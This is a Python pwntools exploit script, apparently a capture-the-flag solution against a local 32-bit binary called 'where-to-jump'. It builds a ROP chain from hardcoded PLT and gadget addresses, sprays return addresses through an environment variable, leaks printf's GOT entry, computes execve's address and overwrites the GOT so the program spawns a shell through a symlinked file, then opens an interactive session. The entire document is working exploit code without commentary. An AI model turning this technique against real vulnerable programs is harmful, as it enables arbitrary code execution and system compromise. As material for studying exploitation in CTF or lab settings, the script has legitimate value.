from pwn import *
import os


execve_addr = 0xf7e067e0
printf_addr = 0xf7d9f670
offset = execve_addr - printf_addr

if os.path.exists("you\n"):
    os.remove("you\n")
os.symlink("sh", "you\n")

printf_plt = 0x8048370
pop_ret = 0x08048355
printf_got = ELF("./where-to-jump").got["printf"]

scanf_plt = 0x80483a0
pop_pop_ret = 0x80485ba
scanf_string = 0x8048621

some_string = 0x8049276
you_string = 0x804861c

ret_addr = 0x0804833e

newline_addr = 0x80485e9

ropchain = p32(printf_plt) + p32(pop_ret) + p32(printf_got) + p32(printf_plt) + p32(pop_ret) + p32(newline_addr) + p32(scanf_plt) + p32(pop_pop_ret) + p32(scanf_string) + p32(printf_got) + p32(printf_plt) + "aaaa" + p32(you_string) + p32(0x08048910) + p32(0x08048910)

address = 0x0804843e
env = {"aaa": (p32(ret_addr) * 30000) +  ropchain + "aa"}

p = process(["./where-to-jump", "aaa"], env=env)
send = hex(address)
print(hex(address))
p.sendline(send)

data = p.recvline()
data = p.recvline()
data = p.recvline()
data = p.recvline()
data = u32(data[0:4])
data = data + offset

p.sendline(hex(data))
print(hex(data))


p.interactive()
